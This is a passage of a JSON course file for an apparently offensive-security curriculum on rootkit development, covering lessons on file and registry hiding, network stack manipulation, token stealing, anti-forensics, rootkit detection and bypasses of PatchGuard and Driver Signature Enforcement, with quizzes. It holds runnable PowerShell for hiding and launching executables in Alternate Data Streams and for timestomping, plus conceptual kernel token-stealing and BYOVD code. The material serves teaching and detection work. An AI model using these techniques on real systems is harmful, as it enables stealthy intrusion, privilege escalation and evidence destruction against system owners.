                            "explanation": "Running in Ring 0 gives the rootkit god-like power over the system. It can read and write to the memory of any process, including the kernel itself, which allows for extremely stealthy cross-process injection."
                        }
                    ]
                }
            },
            {
                "id": "lesson-17",
                "title": "File System and Registry Manipulation",
                "duration": "100 min",
                "objectives": [
                    "Develop a file system filter driver to hide files and directories.",
                    "Use Alternate Data Streams (ADS) for data hiding.",
                    "Implement a registry filter driver to hide registry keys.",
                    "Manipulate Volume Shadow Copies to hide data or find old evidence.",
                    "Develop tools for timestamp manipulation ('timestomping')."
                ],
                "content": {
                    "overview": "This lesson focuses on rootkit techniques for manipulating the non-volatile storage of the system: the file system and the registry. We will learn how to write filter drivers to intercept and modify I/O requests, how to hide data in obscure parts of the file system like Alternate Data Streams, and how to manipulate timestamps to cover an attacker's tracks.",
                    "sections": [
                        {
                            "title": "File System Filter Drivers",
                            "content": "<p>As discussed, a file system filter driver is the modern way to intercept file I/O. By attaching itself to the file system stack, a rootkit can see every `CreateFile`, `ReadFile`, `WriteFile`, and `QueryDirectory` request on the system.</p><h3>Hiding a Directory:</h3><p>To hide a directory (e.g., `C:\\Windows\\system32\\malware`), the rootkit's filter driver intercepts the results of any `QueryDirectory` call for `C:\\Windows\\system32`. It parses the buffer of results, finds the entry for 'malware', and removes it before passing the buffer back up to the user. To any user-mode application, the directory simply does not exist.</p>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Alternate Data Streams (ADS) Exploitation",
                            "content": "<p>ADS is a little-known feature of the NTFS file system that allows a file to have multiple, separate data streams. A file `test.txt` has a main, unnamed data stream where its text is stored. But you can also attach a second, named stream to it, like `test.txt:hidden.exe`.</p><p>Standard tools like Windows Explorer and the `dir` command will not show the existence of this hidden stream. They will just show `test.txt` as a normal, small text file. An attacker can use this to hide their malicious tools and data 'attached' to innocent-looking files on the file system.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Registry Filtering and Redirection",
                            "content": "<p>Similar to file system filtering, a rootkit can also install a registry filter driver. This allows it to intercept calls to the registry and hide its persistence keys.</p><p><strong>Real-world Example:</strong> A rootkit creates a persistence entry in the `Run` key. It also installs a registry filter. When a tool like Autoruns tries to read the `Run` key, the rootkit's filter intercepts the call. It gets the real list of values from the kernel, removes its own malicious entry, and then passes the sanitized list back to Autoruns. The tool sees nothing, even though the malicious key is still present and active in the registry.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Alternate Data Streams (ADS) Hiding Techniques",
                            "language": "powershell",
                            "code": "# This PowerShell script demonstrates how to use Alternate Data Streams (ADS)\n# to hide one file inside another.\n\n# Create a legitimate-looking text file.\nSet-Content -Path .\\legit.txt -Value \"This is a normal file.\"\n\n# The file to hide (e.g., our malicious executable)\n$malware = \"C:\\windows\\system32\\calc.exe\"\n\n# Use Get-Content and Set-Content with the -Stream parameter to hide calc.exe\n# in a hidden stream named 'hidden_payload' attached to legit.txt.\nGet-Content -Path $malware -Raw | Set-Content -Path .\\legit.txt -Stream hidden_payload\n\n# Now, if you do a 'dir', you will only see legit.txt, and its size will be very small.\n# The hidden executable will not be visible.\n\n# To execute the hidden file:\n# We can use a command-line tool like 'wmic' to launch the hidden stream.\nwmic process call create \"$(Get-Item .\\legit.txt -Stream hidden_payload).FullName\""
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "A modern Windows rootkit that wants to hide a file from all user-mode applications would most likely use which technique?",
                            "options": [
                                "SSDT Hooking",
                                "A file system filter driver",
                                "DLL Injection",
                                "Process Hollowing"
                            ],
                            "correct": 1,
                            "explanation": "File system filter drivers are the modern, supported way to intercept file I/O. By attaching to the driver stack, a rootkit can intercept and modify the results of directory listings to hide its files in a very stealthy and stable way."
                        },
                        {
                            "id": 2,
                            "question": "The NTFS feature that allows an attacker to hide a file inside of another, seemingly innocent file is known as:",
                            "options": [
                                "The Master File Table (MFT)",
                                "Alternate Data Streams (ADS)",
                                "The USN Journal",
                                "File compression"
                            ],
                            "correct": 1,
                            "explanation": "ADS is a little-known but powerful feature of NTFS. Because standard tools do not display the named streams, an attacker can use them to hide their tools and payloads from a cursory examination."
                        },
                        {
                            "id": 3,
                            "question": "The act of deliberately modifying a file's timestamps to make it look like it was created at a different time, in order to confuse a forensic investigator, is known as:",
                            "options": [
                                "File carving",
                                "Timestomping",
                                "Hashing",
                                "Encryption"
                            ],
                            "correct": 1,
                            "explanation": "Timestomping is a classic anti-forensic technique used to disrupt timeline analysis by making files appear older or newer than they actually are."
                        }
                    ]
                }
            },
            {
                "id": "lesson-18",
                "title": "Network Stack Manipulation",
                "duration": "100 min",
                "objectives": [
                    "Understand the architecture of the Windows and Linux network stacks.",
                    "Develop a simple NDIS (Windows) or Netfilter (Linux) driver.",
                    "Hook the protocol stack to intercept and modify packets.",
                    "Develop a rootkit that can hide its network connections.",
                    "Implement traffic redirection techniques."
                ],
                "content": {
                    "overview": "This lesson focuses on rootkit techniques for manipulating the network stack. By intercepting traffic at the lowest levels of the operating system, a rootkit can hide its own C&C communications, inject malicious data into legitimate traffic, and become nearly invisible to host-based firewalls and monitoring tools.",
                    "sections": [
                        {
                            "title": "Network Driver Development",
                            "content": "<p>To control the network, a rootkit must interact with the network driver stack.</p><h3>The Stacks:</h3><ul><li><strong>Windows (NDIS):</strong> The Network Driver Interface Specification (NDIS) is the framework for all network drivers on Windows. A rootkit can install a 'filter driver' to intercept packets as they move up and down the stack.</li><li><strong>Linux (Netfilter):</strong> The Netfilter framework in the Linux kernel provides a set of 'hooks' at various points in the packet processing path. A rootkit implemented as an LKM can register a hook function to gain control of any packet.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Hiding Network Connections",
                            "content": "<p>A key goal for a rootkit is to hide its own C&C traffic from local monitoring tools like `netstat`.</p><p><strong>Real-world Example: TCP Connection Hiding.</strong> A rootkit wants to hide its connection to a C2 server. The operating system maintains a list of all active TCP connections in a kernel data structure. A standard `netstat` command gets its output by asking the kernel to list the entries in this table. A kernel-mode rootkit can find this connection table in memory and, using DKOM techniques, can unlink the entry for its own C2 connection. The connection is still active and passing traffic, but it is now invisible to `netstat` and any other tool that relies on the standard OS APIs.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Traffic Redirection and Manipulation",
                            "content": "<p>By controlling the network stack, a rootkit can not only hide traffic, but modify it.</p><h3>Example Techniques:</h3><ul><li><strong>TCP Hijacking:</strong> A rootkit can intercept a legitimate, authenticated TCP connection (like an SSH session) and inject its own malicious commands into the stream.</li><li><strong>DNS Redirection:</strong> The rootkit can intercept all outbound DNS queries. If it sees a query for `mybank.com`, it can return the IP address of the attacker's phishing site instead of the real IP, performing a highly effective man-in-the-middle attack.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "NDIS Driver Development (Conceptual Packet Filter)",
                            "language": "c",
                            "code": "// This is conceptual C++ code for a simple NDIS filter driver on Windows.\n// Its only job is to inspect and potentially drop outbound TCP packets.\n\nVOID FilterSendNetBufferLists(\n    IN NDIS_HANDLE FilterModuleContext,\n    IN PNET_BUFFER_LIST NetBufferLists,\n    IN NDIS_PORT_NUMBER PortNumber,\n    IN ULONG SendFlags\n) {\n    PNET_BUFFER_LIST pCurrentNbl = NetBufferLists;\n\n    while (pCurrentNbl != NULL) {\n        // Get the Ethernet header, IP header, and TCP header from the packet.\n        // ... (code to parse the packet headers) ...\n\n        // --- Malicious Logic ---\n        // If the destination IP address is one we want to block...\n        if (destination_ip == MALICIOUS_IP_TO_BLOCK) {\n            // We can 'absorb' the packet by not calling the next driver in the stack.\n            // This effectively drops the packet silently.\n            // Set a flag to indicate the packet should not be forwarded.\n        } else {\n            // Otherwise, pass the packet down to the next driver in the stack.\n            NdisFSendNetBufferLists(FilterModuleContext, pCurrentNbl, PortNumber, SendFlags);\n        }\n\n        pCurrentNbl = NET_BUFFER_LIST_NEXT_NBL(pCurrentNbl);\n    }\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "The framework in the Linux kernel that allows for the interception and manipulation of network packets is known as:",
                            "options": [
                                "SELinux",
                                "VFS",
                                "Netfilter",
                                "Systemd"
                            ],
                            "correct": 2,
                            "explanation": "Netfilter is the core packet filtering framework in the Linux kernel. A rootkit implemented as an LKM can register a 'netfilter hook' to gain the ability to inspect, modify, or drop any packet that passes through the system."
                        },
                        {
                            "id": 2,
                            "question": "A rootkit wants to hide its network connection from a tool like `netstat`. How would it most likely achieve this?",
                            "options": [
                                "By deleting the `netstat` executable.",
                                "By using a DKOM technique to unlink the data structure for its connection from the kernel's active connection list.",
                                "By sending its traffic very slowly.",
                                "By encrypting its traffic."
                            ],
                            "correct": 1,
                            "explanation": "This is the classic method. The connection remains fully active, but because it has been removed from the list that `netstat` reads, it becomes invisible to the tool and the user."
                        },
                        {
                            "id": 3,
                            "question": "A rootkit that intercepts all outbound DNS queries and returns a malicious IP address for `mybank.com` is performing what kind of attack?",
                            "options": [
                                "A DDoS attack",
                                "DNS Hijacking (a form of Man-in-the-Middle attack)",
                                "A buffer overflow",
                                "A code injection attack"
                            ],
                            "correct": 1,
                            "explanation": "By controlling the DNS response, the rootkit can redirect the user to a phishing site or another malicious server, even if the user typed the correct domain name. This is a powerful traffic redirection technique."
                        }
                    ]
                }
            },
            {
                "id": "lesson-19",
                "title": "Process and Thread Manipulation",
                "duration": "100 min",
                "objectives": [
                    "Monitor process and thread creation events from the kernel.",
                    "Implement advanced thread injection techniques.",
                    "Perform process token manipulation for privilege escalation.",
                    "Manipulate the handle table of a process.",
                    "Develop an advanced process hollowing implementation."
                ],
                "content": {
                    "overview": "This lesson covers advanced rootkit techniques for manipulating processes and threads directly from the kernel. We will explore how to monitor and control process creation, how to steal security tokens to escalate privileges, and how to perform a much stealthier form of process hollowing from a privileged, kernel-mode vantage point.",
                    "sections": [
                        {
                            "title": "Process Creation Monitoring",
                            "content": "<p>A kernel-mode rootkit can register a callback with the operating system to be notified every single time a new process or thread is created. The `PsSetCreateProcessNotifyRoutine` function in the Windows kernel is the mechanism for this.</p><h3>Defensive and Offensive Uses:</h3><ul><li><strong>Defensively:</strong> This is what EDR and antivirus products use to monitor all process creation events and look for suspicious behavior.</li><li><strong>Offensively:</strong> A rootkit can use this callback to perform a 'just-in-time' injection. For example, it could wait for the user to launch `chrome.exe` and then, the instant the process is created, inject its malicious code into it before the browser has a chance to even load its main window.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Process Token Manipulation",
                            "content": "<p>In Windows, every process has an 'access token'. This token defines the security context of the process—which user it is running as and what its privileges are. A process with a token for a standard user cannot access administrative resources.</p><p>A kernel-mode rootkit, running as `SYSTEM`, can find a process with a highly privileged token (like the `lsass.exe` process, which runs as SYSTEM). It can then 'steal' this token and apply it to another, lower-privileged process. This is a classic and powerful privilege escalation technique.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Advanced Process Hollowing",
                            "content": "<p>As discussed, process hollowing involves creating a legitimate process and replacing its code with malicious code. When this is done from a user-mode attacker process, it can be detected by security software that monitors for suspicious cross-process memory operations.</p><p>A kernel-mode rootkit can perform a much stealthier version of process hollowing. Because it has direct access to all memory, it can create the suspended process and then directly map and write its malicious code into the target process's memory space using low-level kernel functions. This is much less likely to be detected by a user-mode EDR, as the malicious memory manipulation is happening from the trusted kernel itself.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Token Privilege Escalation (Conceptual C++)",
                            "language": "cpp",
                            "code": "// This is conceptual C++ kernel driver code for a 'token stealing' attack.\n\n// 1. Find the EPROCESS block for the SYSTEM process (a process that always runs as SYSTEM).\nPEPROCESS systemProcess = FindProcessByName(\"System\");\n\n// 2. Find the EPROCESS block for our target process (e.g., a cmd.exe shell we control).\nPEPROCESS targetProcess = FindProcessByName(\"cmd.exe\");\n\n// 3. Get the access token from the SYSTEM process.\n//    The Token is a member of the EPROCESS structure. The offset is version-dependent.\nPACCESS_TOKEN systemToken = (PACCESS_TOKEN)((PUCHAR)systemProcess + tokenOffset);\n\n// 4. Overwrite the token pointer in our target process's EPROCESS block\n//    with the pointer to the SYSTEM token.\n*(PACCESS_TOKEN*)((PUCHAR)targetProcess + tokenOffset) = systemToken;\n\n// 5. The cmd.exe process, which was running as a standard user, now has the security\n//    token of the SYSTEM process. It has been escalated to the highest privilege level."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "A kernel driver that wants to be notified every time a new process is created on the system would use which mechanism?",
                            "options": [
                                "SSDT Hooking",
                                "Registering a process creation callback (e.g., `PsSetCreateProcessNotifyRoutine`).",
                                "DKOM",
                                "DLL Injection"
                            ],
                            "correct": 1,
                            "explanation": "This is the official, supported kernel mechanism for monitoring process creation. It is used heavily by defensive tools like EDR, and can also be abused by rootkits to perform 'just-in-time' code injection."
                        },
                        {
                            "id": 2,
                            "question": "The security context of a Windows process, which defines its user and privileges, is contained in a kernel object known as an:",
                            "options": [
                                "Access Token",
                                "Handle",
                                "Thread",
                                "Socket"
                            ],
                            "correct": 0,
                            "explanation": "The access token is the key to a process's identity and authority. Stealing a privileged token from another process is a powerful privilege escalation technique."
                        },
                        {
                            "id": 3,
                            "question": "Why is process hollowing performed from a kernel-mode rootkit stealthier than from a user-mode attacker process?",
                            "options": [
                                "It is not stealthier.",
                                "Because the memory manipulation is initiated from the trusted kernel (Ring 0), it is much less likely to be flagged as suspicious by a user-mode security product like an EDR.",
                                "It uses less memory.",
                                "It runs faster."
                            ],
                            "correct": 1,
                            "explanation": "Performing the attack from the kernel allows the rootkit to bypass the very user-mode APIs that EDRs monitor for suspicious cross-process behavior. It is a much more direct and stealthy method of injection."
                        }
                    ]
                }
            },
            {
                "id": "lesson-20",
                "title": "Anti-Forensics and Evidence Destruction",
                "duration": "100 min",
                "objectives": [
                    "Develop a rootkit that can manipulate or clear system event logs.",
                    "Implement techniques to evade memory dump analysis.",
                    "Create methods to hide or destroy on-disk forensic artifacts.",
                    "Manipulate timestamps to confuse a forensic timeline analysis.",
                    "Build a comprehensive anti-forensics framework."
                ],
                "content": {
                    "overview": "A sophisticated rootkit's final job is to cover its tracks. This lesson focuses on the development of anti-forensic techniques designed to destroy evidence, mislead investigators, and make a forensic analysis of the compromised system as difficult as possible.",
                "sections": [
                    {
                        "title": "Log File and Event Log Manipulation",
                        "content": "<p>System logs are a primary source of evidence for an investigator. A rootkit will actively try to tamper with them.</p><h3>Techniques:</h3><ul><li><strong>Event Log Clearing:</strong> The simplest method is to just clear the entire event log. This is noisy and an obvious sign of an intrusion, but it can be effective.</li><li><strong>Selective Deletion:</strong> A more advanced technique is to find and delete only the specific event log records that correspond to the attacker's activity (e.g., their successful login).</li><li><strong>Hooking:</strong> A rootkit can hook the functions that write to the event log and simply filter out any events that it generates, so they are never even written to the disk.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Memory and Disk Forensics Evasion",
                            "content": "<p>A rootkit can also try to make forensic analysis of the system itself more difficult.</p><ul><li><strong>Memory Dump Evasion:</strong> The rootkit can hook the functions used by memory acquisition tools to feed them false data or cause them to crash.</li><li><strong>Disk Forensics Evasion (Timestomping):</strong> This is a classic anti-forensic technique. The rootkit uses a kernel driver to modify the MACB (Modified, Accessed, Created, Birth) timestamps of its files to make them blend in with legitimate system files or to disrupt a timeline analysis.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Evidence Destruction",
                            "content": "<p>In some cases, the attacker's goal is not just stealth, but pure destruction. A 'wiper' is a type of malware whose sole purpose is to destroy data and render the system unbootable.</p><p><strong>Real-world Example: The NotPetya Wiper.</strong> While it masqueraded as ransomware, the NotPetya malware that struck Ukraine in 2017 was actually a destructive wiper. In addition to encrypting files, it had a payload that would corrupt the first 10 sectors of the hard disk, destroying the MBR and the partition table. It then displayed a ransom note, but even if the victim paid, the decryption key they received was useless because the damage to the disk's master boot record was irreversible. The true goal of the attack was destruction, not profit.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Timeline Confusion (Timestomping with PowerShell)",
                            "language": "powershell",
                            "code": "# This PowerShell script demonstrates how an attacker can perform 'timestomping'.\n\n# The malicious file we want to hide\n$maliciousFile = \".\\malware.exe\"\n\n# A legitimate system file we want to mimic\n$legitFile = \"C:\\Windows\\System32\\kernel32.dll\"\n\n# Get the timestamps from the legitimate file\n$legitTimestamps = Get-Item $legitFile\n$creationTime = $legitTimestamps.CreationTime\n$lastWriteTime = $legitTimestamps.LastWriteTime\n$lastAccessTime = $legitTimestamps.LastAccessTime\n\nWrite-Host \"[*] Original malware timestamps:\"\nGet-Item $maliciousFile | Format-List -Property CreationTime, LastWriteTime, LastAccessTime\n\n# Set the timestamps of the malicious file to match the legitimate one\nSet-ItemProperty -Path $maliciousFile -Name CreationTime -Value $creationTime\nSet-ItemProperty -Path $maliciousFile -Name LastWriteTime -Value $lastWriteTime\nSet-ItemProperty -Path $maliciousFile -Name LastAccessTime -Value $lastAccessTime\n\nWrite-Host \"\\n[*] New malware timestamps:\"\nGet-Item $maliciousFile | Format-List -Property CreationTime, LastWriteTime, LastAccessTime\n\n# Now, in a forensic timeline, the malicious file will appear to have been created\n# at the same time as a core system file, making it much harder to spot as a recent addition."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "The act of deliberately modifying a file's timestamps to confuse a forensic investigator is known as:",
                            "options": [
                                "File carving",
                                "Timestomping",
                                "Hashing",
                                "Encryption"
                            ],
                            "correct": 1,
                            "explanation": "Timestomping is a classic anti-forensic technique used to disrupt timeline analysis by making files appear older or newer than they actually are."
                        },
                        {
                            "id": 2,
                            "question": "What is the primary goal of a 'wiper' malware?",
                            "options": [
                                "To steal data.",
                                "To demand a ransom.",
                                "To destroy data and render systems inoperable.",
                                "To gain long-term persistence."
                            ],
                            "correct": 2,
                            "explanation": "A wiper is a purely destructive tool. Its purpose is sabotage, and any ransom demand is often just a decoy to hide its true intent, as seen in the NotPetya attack."
                        },
                        {
                            "id": 3,
                            "question": "A rootkit that wants to hide its own login events from the Windows Security Event Log would most likely do what?",
                            "options": [
                                "Delete the entire event log file, which is a very noisy action.",
                                "Hook the APIs responsible for writing to the event log to filter out its own events before they are written.",
                                "Encrypt the event log.",
                                "Change the time on the computer."
                            ],
                            "correct": 1,
                            "explanation": "Stealthy log manipulation involves intercepting the log writing process. This allows the rootkit to remove only its own specific log entries, which is much less likely to be noticed than clearing the entire log."
                        }
                    ]
                }
            },
            {
                "id": "lesson-21",
                "title": "Rootkit Detection and Analysis",
                "duration": "100 min",
                "objectives": [
                    "Differentiate between signature-based and behavioral-based detection methods.",
                    "Use memory analysis as the primary tool for detecting kernel-mode rootkits.",
                    "Implement integrity checking mechanisms to detect unauthorized modifications.",
                    "Apply heuristic algorithms to find suspicious patterns.",
                    "Develop a custom rootkit scanner."
                ],
                "content": {
                    "overview": "This lesson shifts to the defender's perspective, focusing on the techniques used to detect and analyze the advanced rootkits we have been building. We will explore the limitations of traditional antivirus and learn why memory forensics and cross-view validation are the most effective tools in the hunt for kernel-level threats.",
                "sections": [
                    {
                        "title": "Signature vs. Behavioral Detection",
                        "content": "<ul><li><strong>Signature-Based Detection:</strong> This is how traditional antivirus works. It has a list of known bad file hashes or string signatures. This is completely ineffective against a custom rootkit or polymorphic malware.</li><li><strong>Behavioral Detection:</strong> This is the approach used by modern EDRs. It looks for suspicious *patterns of behavior* (e.g., a Word document spawning PowerShell). This is more effective but can still be bypassed.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Memory Analysis and Cross-View Validation",
                            "content": "<p>The most effective way to find a rootkit is through memory forensics. A rootkit can lie to the running operating system, but it cannot easily lie to an external memory analysis tool that is parsing the raw data structures in a memory dump.</p><p><strong>Cross-View Validation</strong> is the core principle of rootkit detection. The analyst compares the view of the system from a 'high level' (using a standard OS API, which the rootkit might be hooking) with the view from a 'low level' (by parsing the raw kernel structures). A discrepancy between these two views is proof of a rootkit.</p><p><strong>Real-world Example:</strong> An analyst runs `pslist` in Volatility (which uses the high-level OS process list). They then run `psscan` (which finds processes by scanning raw memory). The output of `psscan` shows a process that was not in the `pslist` output. This discrepancy proves that a rootkit is using DKOM to hide a process.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Integrity Checking Mechanisms",
                            "content": "<p>These are defenses designed to detect unauthorized modifications to the system.</p><ul><li><strong>Kernel Patch Protection (PatchGuard):</strong> A Windows feature that periodically checks for modifications to critical kernel structures like the SSDT. If it finds a change, it triggers a BSOD.</li><li><strong>Driver Signature Enforcement:</strong> Modern versions of Windows will, by default, only load kernel drivers that have been digitally signed by Microsoft.</li></ul><p>Rootkit development is an arms race against these protections. A bootkit might try to disable these features before the kernel loads, or a rootkit might find a way to bypass them in memory.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Custom Rootkit Scanner (SSDT Hook Detection)",
                            "language": "python",
                            "code": "# This conceptual Python script demonstrates the logic for detecting an SSDT hook from a memory dump.\n# It would be implemented as a Volatility plugin or a standalone tool.\n\ndef detect_ssdt_hooks(memory_dump):\n    # 1. Find the base address of the kernel (ntoskrnl.exe) in memory.\n    kernel_base, kernel_size = find_kernel_module(memory_dump)\n    \n    # 2. Find the address of the System Service Descriptor Table (SSDT).\n    ssdt_address = find_ssdt(memory_dump)\n    \n    # 3. Iterate through every function pointer in the SSDT.\n    for i, function_pointer in enumerate(read_ssdt_pointers(ssdt_address)):\n        # 4. Check if the function pointer points to an address *outside* of the legitimate\n        #    kernel module's memory range.\n        if not (kernel_base <= function_pointer < kernel_base + kernel_size):\n            print(f\"[!] SSDT Hook Detected at index {i}!\")\n            print(f\"    Original function is supposed to be in the kernel.\")\n            print(f\"    But the pointer is: {hex(function_pointer)}, which points outside the kernel.\")\n            print(\"    This is a high-confidence indicator of a kernel-mode rootkit.\")"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the most effective and reliable method for detecting a kernel-mode rootkit?",
                            "options": [
                                "Running a standard antivirus scan from within the infected OS.",
                                "Performing a full memory analysis from an external, trusted environment and using cross-view validation techniques.",
                                "Checking the browser history.",
                                "Rebooting the computer."
                            ],
                            "correct": 1,
                            "explanation": "A rootkit is designed to lie to any software running within the compromised OS. The only way to get a truthful view is to analyze the system from the outside (via a memory dump) and compare what the OS *says* is happening with what the raw kernel structures *actually* show."
                        },
                        {
                            "id": 2,
                            "question": "An analyst compares the output of `pslist` and `psscan` in Volatility and finds a discrepancy. This is an example of what detection principle?",
                            "options": [
                                "Signature-based detection",
                                "Heuristic detection",
                                "Cross-view validation",
                                "File integrity monitoring"
                            ],
                            "correct": 2,
                            "explanation": "Cross-view validation is the core of rootkit detection. By comparing a high-level, easily hooked view (`pslist`) with a low-level, raw view (`psscan`), an analyst can spot the inconsistencies that prove a rootkit is manipulating the OS."
                        },
                        {
                            "id": 3,
                            "question": "The Windows security feature that is designed to prevent unauthorized patching of critical kernel structures like the SSDT is known as:",
                            "options": [
                                "BitLocker",
                                "User Account Control (UAC)",
                                "Secure Boot",
                                "Kernel Patch Protection (PatchGuard)"
                            ],
                            "correct": 3,
                            "explanation": "PatchGuard is a major hurdle for modern rootkit authors. It periodically checks the integrity of kernel structures, and if it detects a modification (like an SSDT hook), it will intentionally crash the system to prevent a further compromise."
                        }
                    ]
                }
            },
            {
                "id": "lesson-22",
                "title": "Modern Protection Bypass Techniques",
                "duration": "100 min",
                "objectives": [
                    "Understand the workings of Kernel Patch Protection (PatchGuard) and how it can be bypassed.",
                    "Develop a technique to bypass Driver Signature Enforcement (DSE).",
                    "Analyze and evade Control Flow Guard (CFG) and Kernel CFI.",
                    "Discuss methods for bypassing hardware-enforced security features."
                ],
                "content": {
                    "overview": "This lesson covers the advanced offensive research into bypassing the most powerful security mitigations in modern operating systems. We will explore the arms race between attackers and defenders, looking at the techniques used to defeat protections like PatchGuard, Driver Signature Enforcement, and Control Flow Guard.",
                "sections": [
                    {
                        "title": "Kernel Patch Protection (PatchGuard) Bypass",
                        "content": "<p>PatchGuard periodically checks critical kernel structures for unauthorized modifications. Early bypasses involved finding the PatchGuard code in memory and disabling it. Modern bypasses are more sophisticated and often rely on finding a logical flaw or a race condition in the PatchGuard implementation itself. Another approach is to use a bootkit to disable PatchGuard before the kernel even fully loads.</p>",
                        "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Driver Signature Enforcement (DSE) Bypass",
                        "content": "<p>On 64-bit versions of Windows, the kernel will not load a driver unless it has a valid digital signature. This is a major obstacle for a rootkit. </p><p><strong>Real-world Example: Abusing a legitimate, signed driver.</strong> An attacker finds a vulnerability (e.g., a buffer overflow) in a legitimate, signed third-party driver (e.g., a driver for a graphics card or a hardware monitoring tool). They can then exploit this vulnerability in the *legitimate* driver to gain kernel-mode code execution. Because the code is running in the context of a trusted, signed driver, they can then use that access to load their own unsigned, malicious rootkit driver. They are effectively piggybacking on the trust of the vulnerable, but signed, driver.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Control Flow Guard (CFG) Evasion",
                            "content": "<p>CFG is a mitigation that prevents an exploit from hijacking an indirect function call to point to an arbitrary location in memory. It works by checking if the target of the call is one of the valid, pre-determined function entry points.</p><h3>Bypass Techniques:</h3><p>Bypassing CFG is difficult. It often involves finding a flaw in how the CFG bitmap is managed in memory, finding a function pointer that is *not* protected by CFG, or chaining the exploit with an information leak that can be used to disclose the valid target addresses and craft a payload that appears legitimate to the CFG check.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "DSE Bypass via Vulnerable Driver (Conceptual)",
                            "language": "python",
                            "code": "# This is a conceptual script for exploiting a vulnerable driver to disable DSE.\n\n# 1. The researcher has found a signed but vulnerable driver (e.g., 'vulnerable.sys')\n#    that allows an arbitrary write to kernel memory.\n\n# 2. They find the address of the global kernel variable 'g_ciOptions',\n#    which controls Driver Signature Enforcement.\n#    (This address is version-dependent and found via reverse engineering).\nci_options_address = 0xfffff80012345678\n\n# 3. The exploit sends a carefully crafted IOCTL (I/O Control) request\n#    to the vulnerable driver.\n\n# The IOCTL payload contains two things:\n#   - The memory address to write to (ci_options_address)\n#   - The value to write (0x0, which means DSE is disabled)\n\nioctl_payload = craft_arbitrary_write_payload(address=ci_options_address, value=0)\n\n# 4. The vulnerable driver executes the arbitrary write, setting g_ciOptions to 0.\n#    Driver Signature Enforcement is now disabled for the entire system.\n\n# 5. The attacker can now load their own unsigned, malicious rootkit driver.\n#    load_driver(\"malicious_rootkit.sys\")"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "The Windows security feature that periodically checks for unauthorized modifications to critical kernel structures like the SSDT is known as:",
                            "options": [
                                "BitLocker",
                                "User Account Control (UAC)",
                                "Secure Boot",
                                "Kernel Patch Protection (PatchGuard)"
                            ],
                            "correct": 3,
                            "explanation": "PatchGuard is a major hurdle for modern rootkit authors. It acts as an integrity checker for the kernel, and if it detects a modification, it will intentionally crash the system to prevent a further compromise."
                        },
                        {
                            "id": 2,
                            "question": "What is the most common technique for bypassing Driver Signature Enforcement (DSE) on a modern Windows system?",
                            "options": [
                                "Asking the user to disable it.",
                                "Finding and exploiting a vulnerability in a legitimate, already-signed third-party driver to gain kernel execution.",
                                "Modifying the Windows bootloader.",
                                "It cannot be bypassed."
                            ],
                            "correct": 1,
                            "explanation": "This is the 'Bring Your Own Vulnerable Driver' (BYOVD) technique. Since the attacker can't load their own unsigned driver, they exploit a bug in a trusted, signed driver to get their initial foothold in the kernel."
                        },
                        {
                            "id": 3,
                            "question": "Control Flow Guard (CFG) is a security mitigation designed to protect what?",
                            "options": [
                                "The file system from being modified.",
                                "The integrity of indirect function calls, to prevent an attacker from redirecting them to an arbitrary location like a ROP chain.",
                                "The network traffic from being intercepted.",
                                "The boot process from being hijacked."
                            ],
                            "correct": 1,
                            "explanation": "CFG is a powerful mitigation against control-flow hijacking attacks. It creates a bitmap of all valid function entry points and checks the target of any indirect call against this bitmap before allowing the call to proceed."
                        }
                    ]
                }
            },
            {
                "id": "lesson-23",
